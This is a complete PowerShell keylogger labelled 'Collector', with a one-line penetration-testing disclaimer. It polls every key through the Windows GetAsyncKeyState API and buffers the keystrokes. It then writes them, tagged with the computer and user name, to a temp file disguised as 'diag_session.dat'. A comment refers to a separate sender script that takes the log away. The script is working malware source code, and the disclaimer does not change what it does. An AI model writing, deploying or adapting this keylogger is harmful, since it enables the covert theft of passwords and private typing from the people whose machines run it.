# SCRIPT 1: keylogger.ps1 (Collector)
# --- Ethical Disclaimer ---
# For authorized penetration testing only. Unauthorized use is illegal.

# --- Configuration ---
$bufferSize = 50
$logFile = Join-Path $env:TEMP "diag_session.dat"

# --- Keylogger Setup ---
$keyBuffer = [System.Text.StringBuilder]::new()

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class WinAPI { [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vkey); }
"@

# --- Main Loop ---
try {
    while ($true) {
        Start-Sleep -Milliseconds 20

        # Key capturing logic
        for ($i = 1; $i -lt 255; $i++) {
            if ([WinAPI]::GetAsyncKeyState($i) -eq -32767) {
                $keyChar = switch ($i) {
                    8   { "[BACKSPACE]" }; 9   { "[TAB]" }; 13  { "[ENTER]`n" }; 16  { "[SHIFT]" }
                    17  { "[CTRL]" }; 18  { "[ALT]" }; 20  { "[CAPSLOCK]" }; 27  { "[ESC]" }
                    32  { " " }; 37  { "[LEFT]" }; 38  { "[UP]" }; 39  { "[RIGHT]" }; 40  { "[DOWN]" }
                    46  { "[DELETE]" }; { $_ -ge 48 -and $_ -le 90 } { [char]$i }
                    96..105 { [char]($_ - 48) }; 186 { ';' }; 187 { '=' }; 188 { ',' }; 189 { '-' }
                    190 { '.' }; 191 { '/' }; 192 { '`' }; 219 { '[' }; 220 { '\' }; 221 { ']' }; 222 { "'" }
                    default { "" }
                }
                if ($keyChar) { [void]$keyBuffer.Append($keyChar) }
            }
        }

        # Buffer flush logic
        if ($keyBuffer.Length -ge $bufferSize) {
            # If the log file doesn't exist, the first write will add a header.
            if (-not (Test-Path $logFile)) {
                $startTime = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
                $header = "--- New log session started at $startTime on $($env:COMPUTERNAME)\$($env:USERNAME) ---`n"
                $keyBuffer.Insert(0, $header)
            }
            # Add-Content will create the file if it's missing. This handles
            # the case where the sender script has deleted it.
            Add-Content -Path $logFile -Value $keyBuffer.ToString() -Encoding utf8
            $keyBuffer.Clear()
        }
    }
}
catch {
    # On exit, do one final flush to the file.
    if ($keyBuffer.Length -gt 0) {
        Add-Content -Path $logFile -Value $keyBuffer.ToString() -Encoding utf8
    }
}